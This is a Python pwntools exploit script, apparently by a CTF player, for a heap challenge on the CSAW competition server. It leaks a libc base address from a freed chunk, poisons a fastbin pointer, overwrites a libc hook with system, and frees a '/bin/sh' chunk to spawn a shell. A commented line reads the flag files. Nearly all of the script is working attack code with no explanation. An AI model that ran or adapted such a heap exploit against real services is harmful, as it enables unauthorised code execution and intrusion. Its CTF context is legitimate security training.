
import sys
from pwn import *

__author__ = 'b1gtang
'
#context.log_level = 'info'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

L = False # local or remote
E = False # set env

BIN_NAME = sys.argv[1]
BIN_BASE = 0x0000555555554000

LIBC32_L = '/lib/i386-linux-gnu/libc.so.6'
LIBC32_R = './libc_32.so.6'
LIBC64_L = '/lib/x86_64-linux-gnu/libc.so.6'
LIBC64_R = './libc_64.so.6'

if E:
    os.environ['LD_PRELOAD'] = '.'

if L:
    libc = ELF('./libc.so.6')
    r = process(BIN_NAME)
else:
    libc = ELF('./libc.so.6')
    r = remote('pwn.chal.csaw.io',7713)

# gdb.attach(r, execute='b *0x%x' % (BIN_BASE+0x0000000000001201))
#gdb.attach(r, execute='b *0x%x' % (0x000000000402060))

def add_chunk(content,size):
    r.recvuntil('>>')
    r.sendline('1')
    r.recvuntil('>>')
    r.sendline(str(size))
    r.recvuntil('>>')
    r.sendline(content)

def del_chunk(idx):
    r.recvuntil('>>')
    r.sendline('2')
    r.recvuntil('>>')
    r.sendline(str(idx))

def fix_chunk(idx,content,size):
    r.recvuntil('>>')
    r.sendline('3')
    r.recvuntil('>>')
    r.sendline(str(idx))
    r.recvuntil('>>')
    r.sendline(str(size))
    r.recvuntil('>>')
    r.sendline(content)

def see_chunk(idx):
    r.recvuntil('>>')
    r.sendline('4')
    r.recvuntil('>>')
    r.sendline(str(idx))

add_chunk(0x10*'a',0x80)
add_chunk(0x10*'a',0x60)
add_chunk(0x10*'a',0x60)
add_chunk('/bin/sh\x00',0x60)

del_chunk(0)
see_chunk(0)
r.recvuntil('[*]SHOWING....\n')
libc_base = u64(r.recv(8))-0x3c4b78
print hex(libc_base)

del_chunk(2)
#fix_chunk(1,0x60*'b'+p64(0)+p64(0x71)+p64(libc_base+0x3c5ce5),0x78)
fix_chunk(1,0x60*'b'+p64(0)+p64(0x71)+p64(libc_base+0x3c4aed),0x78)

add_chunk(0x10*'a',0x60)
add_chunk(0x10*'a',0x60)
fix_chunk(5,'\x00'*(0x83-8)+p64(libc_base+0x3c5c50),0x90)

add_chunk(0x10*'d',0x80)
add_chunk(0x1*'a',0xb00)
add_chunk(0x38*'\x00'+p64(libc_base+libc.symbols['system']),0x40)

del_chunk(3)
r.interactive()
#r.sendline('cat /*/*/flag')
